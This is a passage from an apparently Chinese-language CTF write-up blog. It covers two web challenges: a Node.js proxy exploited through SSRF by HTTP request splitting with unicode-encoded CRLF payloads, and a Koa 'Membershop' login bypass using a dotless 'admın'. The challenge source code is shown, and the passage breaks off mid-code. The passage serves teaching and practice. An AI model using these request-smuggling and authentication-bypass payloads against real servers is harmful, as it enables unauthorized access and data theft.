</span></span><span style=display:flex><span>                    <span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>render</span><span style=color:#111>(</span><span style=color:#d88200>&#39;proxy&#39;</span><span style=color:#111>,</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                        <span style=color:#75af00>contents</span><span style=color:#f92672>:</span> <span style=color:#75af00>chunk</span> <span style=color:#75715e>// 返回结果
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                    <span style=color:#111>})</span>
</span></span><span style=display:flex><span>                    <span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>end</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>                <span style=color:#111>});</span>
</span></span><span style=display:flex><span>            <span style=color:#111>}</span> <span style=color:#00a8c8>else</span> <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>statusCode</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>404</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                <span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>render</span><span style=color:#111>(</span><span style=color:#d88200>&#39;proxy&#39;</span><span style=color:#111>,</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                    <span style=color:#75af00>contents</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;The resource not found.&#39;</span>
</span></span><span style=display:flex><span>                <span style=color:#111>})</span>
</span></span><span style=display:flex><span>                <span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>end</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>            <span style=color:#111>}</span> <span style=color:#00a8c8>else</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                <span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>end</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>            <span style=color:#111>}</span>
</span></span><span style=display:flex><span>        <span style=color:#111>}).</span><span style=color:#75af00>on</span><span style=color:#111>(</span><span style=color:#d88200>&#39;error&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>e</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Got error: &#34;</span> <span style=color:#f92672>+</span> <span style=color:#75af00>e</span><span style=color:#111>.</span><span style=color:#75af00>message</span><span style=color:#111>);</span> <span style=color:#75715e>// 返回报错原因
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>});</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span><span style=display:flex><span><span style=color:#75af00>server</span><span style=color:#111>.</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>request</span><span style=color:#111>,</span> <span style=color:#75af00>result</span><span style=color:#111>,</span> <span style=color:#75af00>next</span><span style=color:#111>)</span> <span style=color:#111>{</span>    <span style=color:#75715e>// 检查ip是否为本地
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75af00>ip</span> <span style=color:#f92672>=</span> <span style=color:#75af00>request</span><span style=color:#111>.</span><span style=color:#75af00>connection</span><span style=color:#111>.</span><span style=color:#75af00>remoteAddress</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>ip</span><span style=color:#111>.</span><span style=color:#75af00>substr</span><span style=color:#111>(</span><span style=color:#ae81ff>0</span><span style=color:#111>,</span> <span style=color:#ae81ff>7</span><span style=color:#111>)</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#34;::ffff:&#34;</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>ip</span> <span style=color:#f92672>=</span> <span style=color:#75af00>ip</span><span style=color:#111>.</span><span style=color:#75af00>substr</span><span style=color:#111>(</span><span style=color:#ae81ff>7</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>ip</span> <span style=color:#f92672>!=</span> <span style=color:#d88200>&#39;127.0.0.1&#39;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#75af00>ip</span> <span style=color:#f92672>!=</span> <span style=color:#75af00>server_ip</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>render</span><span style=color:#111>(</span><span style=color:#d88200>&#39;unauthorized&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>end</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span> <span style=color:#00a8c8>else</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>next</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span><span style=display:flex><span><span style=color:#75af00>server</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/public_notes&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>request</span><span style=color:#111>,</span> <span style=color:#75af00>result</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>render</span><span style=color:#111>(</span><span style=color:#d88200>&#39;public_notes&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>end</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span><span style=display:flex><span><span style=color:#75af00>server</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/public_links&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>request</span><span style=color:#111>,</span> <span style=color:#75af00>result</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>render</span><span style=color:#111>(</span><span style=color:#d88200>&#39;public_links&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>end</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span><span style=display:flex><span><span style=color:#75af00>server</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/source_code&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>request</span><span style=color:#111>,</span> <span style=color:#75af00>result</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>fs</span><span style=color:#111>.</span><span style=color:#75af00>readFile</span><span style=color:#111>(</span><span style=color:#d88200>&#39;server.js&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;utf8&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>,</span> <span style=color:#75af00>contents</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>throw</span> <span style=color:#75af00>err</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>        <span style=color:#111>}</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>render</span><span style=color:#111>(</span><span style=color:#d88200>&#39;source_code&#39;</span><span style=color:#111>,</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>source</span><span style=color:#f92672>:</span> <span style=color:#75af00>contents</span>    <span style=color:#75715e>// 返回源码
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>})</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>end</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>    <span style=color:#111>})</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span><span style=display:flex><span><span style=color:#75af00>server</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/flag/:token&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>request</span><span style=color:#111>,</span> <span style=color:#75af00>result</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>token</span> <span style=color:#f92672>=</span> <span style=color:#75af00>request</span><span style=color:#111>.</span><span style=color:#75af00>params</span><span style=color:#111>.</span><span style=color:#75af00>token</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>token</span><span style=color:#111>.</span><span style=color:#75af00>length</span> <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>10</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>ip</span><span style=color:#111>)</span> <span style=color:#75715e>// 长度大于10回显ip
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75af00>fs</span><span style=color:#111>.</span><span style=color:#75af00>writeFile</span><span style=color:#111>(</span><span style=color:#d88200>&#39;public/temp/&#39;</span> <span style=color:#f92672>+</span> <span style=color:#75af00>md5</span><span style=color:#111>(</span><span style=color:#75af00>ip</span> <span style=color:#f92672>+</span> <span style=color:#75af00>token</span><span style=color:#111>),</span> <span style=color:#75af00>flag</span><span style=color:#111>,</span> <span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span> <span style=color:#75715e>// 将flag写入public/temp/md5(ip+token)路径下 路径可控 但是访问本身受限 需要SSRF绕过
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>)</span> <span style=color:#00a8c8>throw</span> <span style=color:#75af00>err</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>end</span><span style=color:#111>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>});</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span><span style=display:flex><span><span style=color:#75af00>server</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>request</span><span style=color:#111>,</span> <span style=color:#75af00>result</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>render</span><span style=color:#111>(</span><span style=color:#d88200>&#39;index&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>end</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span><span style=display:flex><span><span style=color:#75af00>server</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;*&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>,</span> <span style=color:#75af00>result</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>sendStatus</span><span style=color:#111>(</span><span style=color:#ae81ff>404</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>end</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span><span style=color:#111>});</span>
</span></span></code></pre></div><p>突破口在它使用的Node.js的版本恰好有上述SSRF的问题</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>setHeader</span><span style=color:#111>(</span><span style=color:#d88200>&#39;X-Node-js-Version&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;v8.12.0&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>setHeader</span><span style=color:#111>(</span><span style=color:#d88200>&#39;X-Express-Version&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;v4.16.3&#39;</span><span style=color:#111>)</span>
</span></span></code></pre></div><p>入手点的代码代码就是这里了</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205210752342.png alt=image-20211205210752342></p><p>现在就说想办法绕过白名单的审查并构造payload；我们需要第一个请求指向<code>/proxy/internal_website/public_notes</code>，第二个请求指向<code>/flag/amiz</code>，让flag存在<code>public/temp/md5(127.0.0.1amiz)</code>路径下</p><pre tabindex=0><code>public_notes\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0166}\u{016c}\u{0161}\u{0167}/amiz
</code></pre><pre tabindex=0><code>/proxy/internal_website/public_notes%C4%A0HTTP%2F1.1%C4%8D%C4%8AHost%3A%C4%A0127.0.0.1%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0%2F%C5%A6%C5%AC%C5%A1%C5%A7%2Famiz
</code></pre><h2 id=安洵杯-2019membershop>[安洵杯 2019]Membershop</h2><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206224942653.png alt=image-20211206224942653></p><p>admin会被过滤，那就先简单登入</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206225301864.png alt=image-20211206225301864></p><p>抓包后通过session可以看出是koa框架</p><p>这里出题人说很容易联想到后端使用<code>toUpperCase()</code>的转换，用拉丁文越权登录<code>admın</code>，之前也有一次做题用到这个点了，但是在这里没有想起来，我的</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206225648044.png alt=image-20211206225648044></p><p>这下可以看源码了</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>Koa</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;koa&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>router</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;koa-router&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>session</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;koa-session&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>bodyParser</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;koa-bodyparser&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>isString</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;underscore&#39;</span><span style=color:#111>).</span><span style=color:#75af00>isString</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>views</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;koa-views&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>path</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;path&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#00a8c8>static</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;koa-static&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>http</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;http&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>fs</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;fs&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>md5</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;md5&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>qs</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;qs&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>app</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>Koa</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>home</span>  <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>router</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>CONFIG</span> <span style=color:#f92672>=</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>key</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;koa:sess&#39;</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>maxAge</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>1800000</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>overwrite</span><span style=color:#f92672>:</span> <span style=color:#00a8c8>true</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>httpOnly</span><span style=color:#f92672>:</span> <span style=color:#00a8c8>true</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>signed</span><span style=color:#f92672>:</span> <span style=color:#00a8c8>true</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>rolling</span><span style=color:#f92672>:</span> <span style=color:#00a8c8>false</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>renew</span><span style=color:#f92672>:</span> <span style=color:#00a8c8>false</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>  <span style=color:#111>};</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>function</span> <span style=color:#75af00>checkUser</span><span style=color:#111>(</span><span style=color:#75af00>username</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>while</span><span style=color:#111>(</span><span style=color:#75af00>username</span><span style=color:#111>.</span><span style=color:#75af00>match</span><span style=color:#111>(</span><span style=color:#d88200>/admin/i</span><span style=color:#111>))</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>      <span style=color:#75af00>username</span> <span style=color:#f92672>=</span> <span style=color:#75af00>username</span><span style=color:#111>.</span><span style=color:#75af00>replace</span><span style=color:#111>(</span><span style=color:#d88200>/admin/i</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#75af00>isString</span><span style=color:#111>(</span><span style=color:#75af00>username</span><span style=color:#111>)</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#75af00>username</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#75af00>username</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span><span style=color:#00a8c8>else</span><span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>undefined</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>function</span> <span style=color:#75af00>checkUrl</span><span style=color:#111>(</span><span style=color:#75af00>url</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#75af00>url</span><span style=color:#111>.</span><span style=color:#75af00>indexOf</span><span style=color:#111>(</span><span style=color:#d88200>&#34;http://&#34;</span><span style=color:#f92672>+</span><span style=color:#75af00>server_ip</span><span style=color:#f92672>+</span><span style=color:#d88200>&#34;:3000/query&#34;</span><span style=color:#111>)</span> <span style=color:#f92672>===</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#75af00>url</span><span style=color:#111>.</span><span style=color:#75af00>indexOf</span><span style=color:#111>(</span><span style=color:#d88200>&#39;save&#39;</span><span style=color:#111>)</span> <span style=color:#f92672>===</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#75af00>url</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span><span style=color:#00a8c8>else</span><span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#d88200>&#39;errorurl&#39;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>function</span> <span style=color:#75af00>WriteResults</span><span style=color:#111>(</span><span style=color:#75af00>sandbox</span><span style=color:#111>,</span><span style=color:#75af00>data</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>let</span> <span style=color:#75af00>filePath</span> <span style=color:#f92672>=</span> <span style=color:#75af00>sandbox</span> <span style=color:#f92672>+</span><span style=color:#d88200>&#39;/results.txt&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Promise</span><span style=color:#111>(</span><span style=color:#75af00>resolve</span> <span style=color:#111>=&gt;{</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>fs</span><span style=color:#111>.</span><span style=color:#75af00>appendFile</span><span style=color:#111>(</span><span style=color:#75af00>filePath</span><span style=color:#111>,</span><span style=color:#75af00>data</span><span style=color:#111>,</span><span style=color:#d88200>&#39;utf8&#39;</span><span style=color:#111>,</span><span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>error</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#75af00>error</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>                    <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>error</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>                    <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>false</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>                <span style=color:#111>}</span>
</span></span><span style=display:flex><span>                <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>&#39;写入成功&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>                <span style=color:#75af00>resolve</span><span style=color:#111>(</span><span style=color:#75af00>filePath</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>});</span>
</span></span><span style=display:flex><span>    <span style=color:#111>});</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>function</span> <span style=color:#75af00>DeleteResults</span><span style=color:#111>(</span><span style=color:#75af00>sandbox</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>let</span> <span style=color:#75af00>filePath</span> <span style=color:#f92672>=</span> <span style=color:#75af00>sandbox</span><span style=color:#f92672>+</span><span style=color:#d88200>&#39;/results.txt&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>fs</span><span style=color:#111>.</span><span style=color:#75af00>unlink</span><span style=color:#111>(</span><span style=color:#75af00>filePath</span><span style=color:#111>),</span><span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>error</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#75af00>error</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>false</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>        <span style=color:#111>}</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>&#39;删除文件成功&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>home</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/query&#39;</span><span style=color:#111>,</span><span style=color:#00a8c8>async</span><span style=color:#111>(</span><span style=color:#75af00>ctx</span><span style=color:#111>)=&gt;{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>query</span><span style=color:#111>.</span><span style=color:#75af00>param</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>response</span><span style=color:#111>.</span><span style=color:#75af00>body</span> <span style=color:#f92672>=</span> <span style=color:#111>String</span><span style=color:#111>(</span><span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>query</span><span style=color:#111>.</span><span style=color:#75af00>param</span><span style=color:#111>).</span><span style=color:#75af00>replace</span><span style=color:#111>(</span><span style=color:#d88200>/&amp;/g</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;&amp;amp;&#39;</span><span style=color:#111>).</span><span style=color:#75af00>replace</span><span style=color:#111>(</span><span style=color:#d88200>/&lt;/g</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;&amp;lt;&#39;</span><span style=color:#111>).</span><span style=color:#75af00>replace</span><span style=color:#111>(</span><span style=color:#d88200>/&gt;/g</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;&amp;gt;&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span><span style=color:#00a8c8>else</span><span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>status</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>403</span><span style=color:#111>;</span>
